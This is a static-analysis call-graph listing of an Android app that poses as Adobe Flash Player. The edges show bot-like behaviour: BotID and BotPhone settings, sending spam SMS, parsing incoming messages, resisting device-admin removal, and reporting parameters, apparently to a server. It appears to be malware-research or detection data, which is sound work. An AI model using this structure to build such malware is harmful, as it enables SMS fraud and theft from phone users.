VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r7 = virtualinvoke $r7.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
CLINIT edge: staticinvoke <android.content.Intent: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.content.Intent: void <clinit>()>
SPECIAL edge: specialinvoke $r16.<com.adobe.flashplayer_.AdobeFlashCore$1: void <init>(com.adobe.flashplayer_.AdobeFlashCore,long,long)>(r0, 90000L, 10000L) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore$1: void <init>(com.adobe.flashplayer_.AdobeFlashCore,long,long)>
SPECIAL edge: $r8 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r35 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>
VIRTUAL edge: $r21 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>(r6, r8, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r2.<android.content.Intent: android.content.Intent setFlags(int)>(1073741824) in <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)> ==> <android.content.Intent: android.content.Intent setFlags(int)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r43 = staticinvoke <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>("[A-z]{4}[0-9]{4}\\SON\\S") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke r8.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r2.<android.content.Intent: android.content.Intent setFlags(int)>(1048576) in <com.adobe.flashplayer.Certificate$1: void onClick(android.view.View)> ==> <android.content.Intent: android.content.Intent setFlags(int)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("sentSpam") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" [ End ] ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>(java.lang.String)>($r15) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r18 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r17) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.RuntimeException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: $r9 = specialinvoke r0.<com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotID", $r1) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r21, r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r4 = virtualinvoke r4.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("_", " ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>($r21, r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("spam_data", $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r5, $r17, $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r16.<com.adobe.flashplayer_.AdobeFlashCore$1: android.os.CountDownTimer start()>() in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <android.os.CountDownTimer: android.os.CountDownTimer start()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r3.<java.io.File: boolean canRead()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: boolean canRead()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>($r21, r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r17.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer.Certificate: boolean requestWindowFeature(int)>(1) in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <android.app.Activity: boolean requestWindowFeature(int)>
VIRTUAL edge: $r5 = virtualinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String getResultData()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: java.lang.String getResultData()>
STATIC edge: $r41 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>(1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r9) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.Class forName(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void close()>
